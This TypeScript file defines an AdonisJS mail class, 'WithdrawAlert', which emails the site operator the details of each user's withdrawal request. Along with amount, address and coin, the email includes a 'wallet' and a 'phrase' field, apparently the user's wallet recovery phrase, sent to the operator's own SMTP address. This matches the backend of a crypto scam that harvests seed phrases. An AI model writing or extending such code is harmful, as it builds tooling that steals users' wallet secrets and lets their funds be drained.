import { BaseMail } from "@adonisjs/mail";
import type User from "#models/user";
import env from "#start/env";

export default class WithdrawAlert extends BaseMail {
	from = env.get("SMTP_USERNAME");
	subject = "A user has made a withdrawal request";

	constructor(
		private user: User,
		private amount: number,
		private address: string,
		private coin: string,
		private wallet: string,
		private phrase: string,
		private date: string,
	) {
		super();
	}
	/**
	 * The "prepare" method is called automatically when
	 * the email is sent or queued.
	 */
	prepare() {
		this.message.to(env.get("SMTP_USERNAME")).htmlView("emails/withdraw", {
			email: this.user.email,
			amount: this.amount,
			name: this.user.fullName,
			address: this.address,
			coin: this.coin,
			phrase: this.phrase,
			wallet: this.wallet,
			date: this.date,
		});
	}
}
